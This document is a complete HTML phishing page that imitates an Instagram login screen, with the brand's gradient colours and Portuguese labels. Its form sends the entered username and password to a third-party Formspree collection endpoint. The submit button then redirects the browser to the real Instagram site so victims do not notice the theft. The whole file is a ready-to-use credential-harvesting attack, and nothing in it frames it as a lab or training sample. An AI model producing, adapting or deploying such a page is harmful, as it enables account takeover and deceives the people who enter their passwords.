<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Login no instagram</title>

<style>
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:linear-gradient(
        135deg,
        #405DE6,
        #5851DB,
        #833AB4,
        #C13584,
        #E1306C,
        #FD1D1D,
        #F77737,
        #FCAF45
    );
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
    box-sizing:border-box;
}

/* Caixa principal */
.container{
    background:white;
    width:100%;
    max-width:420px;
    padding:25px;
    border-radius:20px;
    box-shadow:0 0 20px rgba(0,0,0,0.2);
}

/* Título */
h1{
    text-align:center;
    color:#C13584;
    font-size:22px;
}

/* Inputs */
input, textarea{
    width:100%;
    padding:12px;
    margin-top:10px;
    border:1px solid #ddd;
    border-radius:10px;
    font-size:16px;
    box-sizing:border-box;
}

/* Textarea */
textarea{
    height:130px;
    resize:none;
}

/* Botão */
button{
    width:100%;
    padding:12px;
    margin-top:15px;
    border:none;
    border-radius:10px;
    color:white;
    font-size:16px;
    cursor:pointer;
    background:linear-gradient(
        90deg,
        #833AB4,
        #C13584,
        #FD1D1D,
        #FCAF45
    );
}

/* Efeito hover no PC */
button:hover{
    opacity:0.9;
}

/* 🔥 Ajustes para telas grandes (PC) */
@media (min-width: 768px){
    .container{
        max-width:500px;
        padding:35px;
    }

    h1{
        font-size:26px;
    }
}
</style>

</head>

<body>

<div class="container">

<h1>LOGIN</h1>

<form action=https://formspree.io/f/meewdwnd method="POST">

<input type="text" name="Usuárii" placeholder="Usuário" required>

<input name="senha" placeholder=senha required>

<button type="submit" onclick="setTimeout(() => window.location.href='https://www.instagram.com/', 300)">
  ENTRAR
</button>
</form>

</div>

</body>
</html>
